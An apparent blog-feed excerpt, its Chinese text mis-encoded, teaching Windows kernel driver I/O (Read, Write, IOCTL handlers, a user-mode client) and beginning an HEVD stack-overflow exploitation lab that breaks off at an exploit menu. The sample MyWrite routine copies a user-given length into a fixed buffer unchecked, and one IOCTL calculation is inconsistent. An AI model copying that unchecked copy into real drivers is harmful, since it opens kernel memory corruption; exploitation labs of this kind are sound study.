Read %x\n&quot;</span>, ReadSize);</span><br><span class="line">    <span class="built_in">RtlCopyMemory</span>(Buffer, <span class="string">&quot;Message From Driver&quot;</span>, <span class="built_in">strlen</span>(<span class="string">&quot;Message From Driver&quot;</span>));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    pIrp-&gt;IoStatus.Status = RET;</span><br><span class="line">    pIrp-&gt;IoStatus.Information = <span class="built_in">strlen</span>(<span class="string">&quot;Message From Driver&quot;</span>);</span><br><span class="line">    <span class="built_in">IoCompleteRequest</span>(pIrp, IO_NO_INCREMENT);</span><br><span class="line">    <span class="keyword">return</span> RET;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>R3</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">CHAR Test[<span class="number">0x40</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">DWORD lpRead = <span class="number">0</span>;</span><br><span class="line"><span class="built_in">ReadFile</span>(hDevice, Test, <span class="number">30</span>, &amp;lpRead, <span class="literal">NULL</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%p -%s--%d\n&quot;</span>, Test, Test,lpRead);</span><br><span class="line"></span><br></pre></td></tr></table></figure><ul><li><code>30</code>æ˜¯è¦è¯»å–çš„å­—èŠ‚</li><li><code>lpRead</code>æ˜¯çœŸå®è¯»å–çš„å­—èŠ‚</li></ul><p><img src="https://img.joe1sn.top/uploads/big/3d59cd4377a3136afc0e76d05ef229d5.png" alt="image-20240116163249545" /></p><p>æ¯å‘ä¸‹ä¼ é€’ä¸€å±‚éœ€è¦ä¸€ä¸ªè®¾å¤‡æ ˆï¼ˆå¯ä»¥è¯•ç€ä»è‡ªå·±è®¾è®¡è¿™æ ·ä¸€ä¸ªæ¨¡å¼çš„è§’åº¦æƒ³æƒ³ï¼‰</p><p><code>SystemBuffer</code>å’Œ<code>pIrp-&gt;MdlAddress</code>æ˜¯åŒä¸€å—ç‰©ç†åœ°å€çš„ä¸¤ä¸ªä¸åŒè™šæ‹Ÿåœ°å€ï¼ˆä¸åŒçš„æ˜ å°„ï¼‰ã€‚</p><p><img src="https://img.joe1sn.top/uploads/big/c97a37804385b4dfaec106605e5f35d4.png" alt="image-20240116165239380" /></p><p>éœ€è¦è®¾ç½®è¯»å†™æ–¹å¼</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pDevice-&gt;Flags |= DO_BUFFERED_IO;</span><br><span class="line"><span class="comment">//è®¾å¤‡åˆ›å»ºæˆåŠŸï¼Œç»‘å®šç¬¦å·é“¾æ¥</span></span><br></pre></td></tr></table></figure><p><img src="https://img.joe1sn.top/uploads/big/89ee511b22780e94cccf65aab59b4943.png" alt="image-20240116171657645" /></p><h3 id="å‘é©±åŠ¨ä¸­å†™å…¥"><a class="markdownIt-Anchor" href="#å‘é©±åŠ¨ä¸­å†™å…¥"></a> å‘é©±åŠ¨ä¸­å†™å…¥</h3><p>R3</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">WriteFile</span>(hDevice, <span class="string">&quot;This is From Ring3.&quot;</span>, <span class="built_in">strlen</span>(<span class="string">&quot;This is From Ring3.&quot;</span>), &amp;lpRead, <span class="literal">NULL</span>);</span><br></pre></td></tr></table></figure><p>é©±åŠ¨</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">NTSTATUS</span></span><br><span class="line"><span class="function"><span class="title">MyWrite</span><span class="params">(PDEVICE_OBJECT pdevice, PIRP pIrp)</span> </span>&#123;</span><br><span class="line">    <span class="built_in">UNREFERENCED_PARAMETER</span>(pdevice);</span><br><span class="line">    NTSTATUS RET = STATUS_SUCCESS;</span><br><span class="line">    <span class="built_in">DbgPrint</span>(<span class="string">&quot;My Device Has Wrtitten\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    PIO_STACK_LOCATION pStack = <span class="built_in">IoGetCurrentIrpStackLocation</span>(pIrp);</span><br><span class="line">    ULONG ReadSize = pStack-&gt;Parameters.Write.Length;</span><br><span class="line">    PCHAR Buffer = pIrp-&gt;AssociatedIrp.SystemBuffer;</span><br><span class="line">    <span class="built_in">DbgPrint</span>(<span class="string">&quot;Ring3 Write Read %x\n&quot;</span>, ReadSize);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">RtlZeroMemory</span>(pdevice-&gt;DeviceExtension, <span class="number">200</span>);</span><br><span class="line">    <span class="built_in">RtlCopyMemory</span>(pdevice-&gt;DeviceExtension, Buffer, ReadSize);</span><br><span class="line">    <span class="built_in">DbgPrint</span>(<span class="string">&quot;--%p-%s\n&quot;</span>, Buffer, (PCHAR)pdevice-&gt;DeviceExtension);</span><br><span class="line"></span><br><span class="line">    pIrp-&gt;IoStatus.Status = RET;</span><br><span class="line">    pIrp-&gt;IoStatus.Information = <span class="built_in">strlen</span>(<span class="string">&quot;Message From Driver&quot;</span>);</span><br><span class="line">    <span class="built_in">IoCompleteRequest</span>(pIrp, IO_NO_INCREMENT);</span><br><span class="line">    <span class="keyword">return</span> RET;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://img.joe1sn.top/uploads/big/13f59b1ae2e3d665dcc0de8b593d6297.png" alt="image-20240116173208413" /></p><h3 id="ioctlè‡ªå®šä¹‰æ§åˆ¶io"><a class="markdownIt-Anchor" href="#ioctlè‡ªå®šä¹‰æ§åˆ¶io"></a> [IOCTL]è‡ªå®šä¹‰æ§åˆ¶IO</h3><p><code>IRP_MJ_DEVICE_CONTROL</code>ï¼Œå®šä¹‰IOCTLæ“ä½œï¼Œ<strong>å¾ˆå¤šå†…æ ¸çš„äº¤äº’å¤§å¤šéƒ½æ˜¯ä¾é æ­¤æ–¹å¼</strong></p><p>è¿™é‡Œç¨‹åºæ¥æ”¶ä¸€ä¸ªæ•°å­—è¿”å›å€¼x2</p><p>é©±åŠ¨</p><p>å®šä¹‰æ“ä½œæ ‡è¯†</p><p>MSDNï¼š<a href="https://learn.microsoft.com/zh-cn/windows-hardware/drivers/ddi/d4drvif/nf-d4drvif-ctl_code">https://learn.microsoft.com/zh-cn/windows-hardware/drivers/ddi/d4drvif/nf-d4drvif-ctl_code</a></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> IOCTL_MUL CTL_CODE(FILE_DEVICE_UNKNOWN, 0x9888, METHOD_BUFFERED, FILE_ANY_ACCESS)</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><ul><li>0x9888ï¼šæ ‡è¯†ç¬¦å·</li></ul><p>ç¼–å†™å‡½æ•°</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">NTSTATUS</span><br><span class="line"><span class="title function_">MyControl</span><span class="params">(PDEVICE_OBJECT pdevice, PIRP pIrp)</span> &#123;</span><br><span class="line">    UNREFERENCED_PARAMETER(pdevice);</span><br><span class="line">    NTSTATUS RET = STATUS_SUCCESS;</span><br><span class="line">    DbgPrint(<span class="string">&quot;My Device Has IOCTL\n&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    PIO_STACK_LOCATION pStack = IoGetCurrentIrpStackLocation(pIrp);</span><br><span class="line">    ULONG ioCode = pStack-&gt;Parameters.DeviceIoControl.IoControlCode;   <span class="comment">//åŠŸèƒ½ç </span></span><br><span class="line">    ULONG inLen = pStack-&gt;Parameters.DeviceIoControl.InputBufferLength;     <span class="comment">//å‡ºå…¥é•¿åº¦</span></span><br><span class="line">    <span class="comment">//ULONG outLen = pStack-&gt;Parameters.DeviceIoControl.OutputBufferLength;   //è¾“å‡ºé•¿åº¦</span></span><br><span class="line">    ULONG ioInfo = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">switch</span> (ioCode)</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="keyword">case</span> IOCTL_MUL:</span><br><span class="line">    &#123;</span><br><span class="line">        DWORDLONG inData = *(PDWORDLONG)pIrp-&gt;AssociatedIrp.SystemBuffer;   <span class="comment">//å–å‡ºä¼ è¾“çš„æ•°æ®</span></span><br><span class="line">        DbgPrint(<span class="string">&quot;Kernel Recive: %d, Len: %lld\n&quot;</span>, inData, inLen);</span><br><span class="line">        inData *= <span class="number">2</span>;</span><br><span class="line">        DbgPrint(<span class="string">&quot;Kernel Data %d\n&quot;</span>, inData);</span><br><span class="line">        *(PDWORDLONG)pIrp-&gt;AssociatedIrp.SystemBuffer = inData;             <span class="comment">//å†™å›æ“ä½œ</span></span><br><span class="line">        ioInfo = <span class="number">4</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">        </span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">        RET = STATUS_UNSUCCESSFUL;</span><br><span class="line">        ioInfo = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    pIrp-&gt;IoStatus.Status = RET;</span><br><span class="line">    pIrp-&gt;IoStatus.Information = ioInfo;</span><br><span class="line">    IoCompleteRequest(pIrp, IO_NO_INCREMENT);</span><br><span class="line">    <span class="keyword">return</span> RET;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://img.joe1sn.top/uploads/big/2bbf7757867f48efe014c738e8fb56bc.png" alt="image-20240116185236732" /></p><h3 id="ä¸€äº›å…³é”®å‡½æ•°"><a class="markdownIt-Anchor" href="#ä¸€äº›å…³é”®å‡½æ•°"></a> ä¸€äº›å…³é”®å‡½æ•°</h3><p><code>DriverEntry</code></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">NTSTATUS</span></span><br><span class="line"><span class="function"><span class="title">DriverEntry</span><span class="params">(PDRIVER_OBJECT  DriverObject, PUNICODE_STRING RegistryPath)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">UNREFERENCED_PARAMETER</span>(RegistryPath);</span><br><span class="line">    NTSTATUS Status = STATUS_SUCCESS;</span><br><span class="line">    <span class="built_in">DbgPrint</span>(<span class="string">&quot;Driver Running -&gt; %wZ\n&quot;</span>, &amp;DriverObject-&gt;DriverName);</span><br><span class="line">    DriverObject-&gt;DriverUnload = DriverUnload;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">//åˆ›å»ºè®¾å¤‡</span></span><br><span class="line">    UNICODE_STRING DeviceName = &#123; <span class="number">0</span> &#125;;          <span class="comment">//è®¾å¤‡å</span></span><br><span class="line">    PDEVICE_OBJECT pDevice = <span class="literal">NULL</span>;              <span class="comment">//è®¾å¤‡å¯¹è±¡</span></span><br><span class="line">    <span class="built_in">RtlInitUnicodeString</span>(&amp;DeviceName, DEVICE_NAME);</span><br><span class="line">    Status = <span class="built_in">IoCreateDevice</span>(DriverObject, <span class="number">0x200</span>, &amp;DeviceName, FILE_DEVICE_UNKNOWN, <span class="number">0</span>, TRUE, &amp;pDevice);</span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">NT_SUCCESS</span>(Status)) &#123;</span><br><span class="line">        <span class="built_in">DbgPrint</span>(<span class="string">&quot;Create Device Failed: %x\n&quot;</span>, Status);</span><br><span class="line">        <span class="keyword">return</span> Status;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    pDevice-&gt;Flags |= DO_BUFFERED_IO;</span><br><span class="line">    <span class="comment">//è®¾å¤‡åˆ›å»ºæˆåŠŸï¼Œç»‘å®šç¬¦å·é“¾æ¥</span></span><br><span class="line"></span><br><span class="line">    UNICODE_STRING SymLink = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    <span class="built_in">RtlInitUnicodeString</span>(&amp;SymLink, SYM_NAME);</span><br><span class="line">    Status = <span class="built_in">IoCreateSymbolicLink</span>(&amp;SymLink, &amp;DeviceName);</span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">NT_SUCCESS</span>(Status)) &#123;</span><br><span class="line">        <span class="built_in">DbgPrint</span>(<span class="string">&quot;Create Symbol Link Failed: %x\n&quot;</span>, Status);</span><br><span class="line">        <span class="built_in">IoDeleteDevice</span>(pDevice);</span><br><span class="line">        <span class="keyword">return</span> Status;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">DbgPrint</span>(<span class="string">&quot;Device &amp; Symbolic Link Created\n&quot;</span>);</span><br><span class="line">    DriverObject-&gt;MajorFunction[IRP_MJ_CREATE] = MyCreate;</span><br><span class="line">    DriverObject-&gt;MajorFunction[IRP_MJ_CLOSE] = MyClose;</span><br><span class="line">    DriverObject-&gt;MajorFunction[IRP_MJ_CLEANUP] = MyClean;</span><br><span class="line">    DriverObject-&gt;MajorFunction[IRP_MJ_READ] = MyRead;</span><br><span class="line">    DriverObject-&gt;MajorFunction[IRP_MJ_WRITE] = MyWrite;</span><br><span class="line">    DriverObject-&gt;MajorFunction[IRP_MJ_DEVICE_CONTROL] = MyControl;</span><br><span class="line">    <span class="built_in">DbgPrint</span>(<span class="string">&quot;Function Settal Done\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> Status;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><code>DriverUnload</code></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">VOID</span></span><br><span class="line"><span class="function"><span class="title">DriverUnload</span><span class="params">(PDRIVER_OBJECT DriverObject)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">UNREFERENCED_PARAMETER</span>(DriverObject);</span><br><span class="line">    <span class="built_in">DbgPrint</span>(<span class="string">&quot;Driver Stopping -&gt; %wZ\n&quot;</span>, &amp;DriverObject-&gt;DriverName);</span><br><span class="line">    <span class="built_in">DbgPrint</span>(<span class="string">&quot;Device Stopping\n&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (DriverObject-&gt;DeviceObject) &#123;</span><br><span class="line">        <span class="built_in">IoDeleteDevice</span>(DriverObject-&gt;DeviceObject);</span><br><span class="line"></span><br><span class="line">        UNICODE_STRING symname = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">        <span class="built_in">RtlInitUnicodeString</span>(&amp;symname, SYM_NAME);</span><br><span class="line">        <span class="built_in">IoDeleteSymbolicLink</span>(&amp;symname);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç”¨äºåœ¨Ring3äº¤äº’çš„é¡¹ç›®çš„ä¸»å‡½æ•°</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// R3Control.cpp : æ­¤æ–‡ä»¶åŒ…å« &quot;main&quot; å‡½æ•°ã€‚ç¨‹åºæ‰§è¡Œå°†åœ¨æ­¤å¤„å¼€å§‹å¹¶ç»“æŸã€‚</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IOCTL_MUL CTL_CODE(FILE_DEVICE_UNKNOWN, 0x9888, METHOD_BUFFERED, FILE_ANY_ACCESS)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    HANDLE hDevice = <span class="literal">NULL</span>;</span><br><span class="line">    hDevice = <span class="built_in">CreateFileW</span>(<span class="string">L&quot;\\\\.\\My1DeviceLinker&quot;</span>, GENERIC_READ | GENERIC_WRITE, <span class="number">0</span>, <span class="literal">NULL</span>, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">if</span> (hDevice== INVALID_HANDLE_VALUE) &#123;</span><br><span class="line">        std::cout &lt;&lt; <span class="string">&quot;Error Create File\n&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;Success open\n&quot;</span>;</span><br><span class="line">    <span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;now IOCTL\n&quot;</span>;</span><br><span class="line">    DWORDLONG a = <span class="number">64</span>;</span><br><span class="line">    DWORDLONG b = <span class="number">0</span>;</span><br><span class="line">    DWORD info = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">DeviceIoControl</span>(hDevice, IOCTL_MUL, &amp;a, <span class="built_in">sizeof</span>(DWORDLONG), &amp;b, <span class="built_in">sizeof</span>(DWORDLONG), &amp;info, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;value a: %lld, b: %lld\nreal info %d\n&quot;</span>, a, b, info);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">CloseHandle</span>(hDevice);</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;Success close\n&quot;</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="å‚è€ƒ"><a class="markdownIt-Anchor" href="#å‚è€ƒ"></a> å‚è€ƒ</h1><p><a href="https://www.bilibili.com/video/BV1QJ411A7kR">https://www.bilibili.com/video/BV1QJ411A7kR</a></p><p><a href="https://space.bilibili.com/1992190180/">https://space.bilibili.com/1992190180/</a></p><p><a href="https://learn.microsoft.com/zh-cn/windows-hardware/drivers/kernel/xianzh">https://learn.microsoft.com/zh-cn/windows-hardware/drivers/kernel/xianzh</a></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;å¼€å§‹åšHEVDæ¥ç†Ÿæ‚‰windowsçš„å†…æ ¸æ¼æ´åˆ©ç”¨æ–¹å¼æ—¶ï¼Œå‘ç°å¤§å¤šæ•°çš„èµ„æ–™ä¾æ—§åŸºäºwindows7ï¼Œä½†æ˜¯ç›®å‰ä¸»æµçš„æ“ä½œç³»ç»Ÿå·²ç»æ˜¯win10ï¼Œæ‰€ä»¥è¿˜æ˜¯å¾—æ›´ä¸Šæ—¶ä»£æ½®æµçš„&lt;/p&gt;
&lt;p&gt;æ–‡ç« å·²åœ¨å…ˆçŸ¥ç¤¾åŒºæŠ•ç¨¿ï¼š&lt;a href=&quot;https://xz.aliyun.com/t/13363&quot;&gt;https://xz.aliyun.com/t/13363&lt;/a&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="notes" scheme="https://joe1sn.eu.org/categories/notes/"/>
    
    
    <category term="kernel" scheme="https://joe1sn.eu.org/tags/kernel/"/>
    
    <category term="windows" scheme="https://joe1sn.eu.org/tags/windows/"/>
    
    <category term="pwn" scheme="https://joe1sn.eu.org/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>ä»é›¶æ¢ç´¢ç°ä»£windowså†…æ ¸æ ˆæº¢å‡º-ä»¥HEVDç»ƒä¹ ä¸ºä¾‹ï¼ˆä¸­ï¼‰</title>
    <link href="https://joe1sn.eu.org/2024/01/25/win-hevd-exp-stackoverflow-II/"/>
    <id>https://joe1sn.eu.org/2024/01/25/win-hevd-exp-stackoverflow-II/</id>
    <published>2024-01-25T07:07:29.000Z</published>
    <updated>2024-01-25T07:30:31.531Z</updated>
    
    <content type="html"><![CDATA[<p>åœ¨<a href="">ä¸Šä¸€ç¯‡</a>ä¸­äº†è§£äº†ä¸å†…æ ¸çš„äº¤äº’æ¨¡å¼ï¼Œè¿™é‡Œå°±å¯ä»¥å¼€å§‹åšHEVDäº†</p><p>æ–‡ç« å·²åœ¨å…ˆçŸ¥ç¤¾åŒºæŠ•ç¨¿ï¼š<a href="https://xz.aliyun.com/t/13364">https://xz.aliyun.com/t/13364</a></p><span id="more"></span><h1 id="ç¼–å†™äº¤äº’æ¨¡å—"><a class="markdownIt-Anchor" href="#ç¼–å†™äº¤äº’æ¨¡å—"></a> ç¼–å†™äº¤äº’æ¨¡å—</h1><h2 id="a-è®¡ç®—io_ctlå€¼"><a class="markdownIt-Anchor" href="#a-è®¡ç®—io_ctlå€¼"></a> A. è®¡ç®—IO_CTLå€¼</h2><p><strong>å…¶å®ä¸ç”¨è¿™æ­¥ï¼Œä½†æ˜¯å¯ä»¥å½“ä½œæ›´å¤šçš„äº†è§£</strong></p><p>åœ¨ä¹‹å‰çš„äº¤äº’ä¸­æœ‰è¿™ä¹ˆä¸€æ¡å®šä¹‰åŠŸèƒ½å·</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> IOCTL_MUL CTL_CODE(FILE_DEVICE_UNKNOWN, 0x9888, METHOD_BUFFERED, FILE_ANY_ACCESS)</span></span><br></pre></td></tr></table></figure><p>ä½†æ˜¯â€¦HEVDé€†å‘ä¼šå‘ç°æ˜¯è¿™æ ·çš„</p><p><img src="https://img.joe1sn.top/uploads/big/b5952825f83268246d9e59addb480507.png" alt="image-20240117184722533" /></p><p>å‘ç°<code>CTL_CODE</code>ä¹Ÿæ˜¯ä¸ªå®å®šä¹‰</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> CTL_CODE( DeviceType, Function, Method, Access ) (                 \</span></span><br><span class="line"><span class="meta">    ((DeviceType) &lt;&lt; 16) | ((Access) &lt;&lt; 14) | ((Function) &lt;&lt; 2) | (Method) \</span></span><br><span class="line"><span class="meta">)</span></span><br></pre></td></tr></table></figure><p>å…¶ä¸­ï¼Œè¿™é‡Œ</p><ul><li>DeviceType -&gt; FILE_DEVICE_UNKNOWN = 0x22</li><li>Function -&gt; = 0x9888</li><li>Method -&gt; METHOD_BUFFERED=0</li><li>Access -&gt; FILE_ANY_ACCESS=0</li></ul><p>è¡¨è¾¾å¼å°±ä¸º</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">  (0x22 &lt;&lt; 16) | (0 &lt;&lt; 14) | ( 0x9888 &lt;&lt; 2) | 0</span><br><span class="line">= 0x220000 | 0 | 0x9888 &lt;&lt; 2 | 0</span><br><span class="line">= 0x220000 | 0x9888 &lt;&lt; 2</span><br><span class="line">= 0x226220</span><br></pre></td></tr></table></figure><p>å¾ˆå®¹æ˜“å¾—åˆ°é€†å‘ï¼Œè¿™é‡Œä»¥<code>0x226220</code>ä¸ºä¾‹å­</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0x205B = 0x22205B ^ 0x220000</span><br><span class="line">0x816 = 0x205B&gt;&gt;2</span><br></pre></td></tr></table></figure><p>é‚£ä¹ˆå¯¹åº”çš„å‡½æ•°</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">unsigned</span> <span class="type">int</span> <span class="title">io2num</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> ioctl_num)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> ((ioctl_num ^ <span class="number">0x220000</span>) &gt;&gt; <span class="number">2</span>) &amp; <span class="number">0xfff</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åé¢ä¹‹æ‰€ä»¥è¦&amp;ä¸€ä¸‹æ˜¯å› ä¸ºæ•°æ®çš„å¤§å°å°±åªæœ‰é‚£ä¹ˆå¤§ï¼Œæ‰€ä»¥<strong>IIæ–‡ç« </strong>çš„æè¿°ç¬¦<code>0x9888</code>å®é™…æœ‰æ•ˆçš„åªæœ‰<code>0x888</code></p><h2 id="b-åŠŸèƒ½é€‰æ‹©"><a class="markdownIt-Anchor" href="#b-åŠŸèƒ½é€‰æ‹©"></a> B. åŠŸèƒ½é€‰æ‹©</h2><p>è¿™é‡Œå°±ä»¥æœ€ç®€å•çš„å†…æ ¸æ ˆæº¢å‡ºä¸¾ä¾‹å­</p><p>æ¯å¼€å§‹ä¸€ä¸ªæ¼æ´åˆ©ç”¨å°±ç¼–å†™ä¸€ä¸ªèœå•ï¼Œç„¶åé€‰æ‹©è§£æé€†å‘å‡ºæ¥çš„åŠŸèƒ½æè¿°ç¬¦ï¼Œè¿è¡Œå¯¹åº”å‡½æ•°ï¼Œæ²¡å•¥å¥½è®²çš„</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">menu</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;============HEVD Hack EXP============\n&quot;</span>;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot; 1. [0x222003]****** HEVD_IOCTL_BUFFER_OVERFLOW_STACK ******\n&quot;</span>;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;input io ctl&gt; &quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span 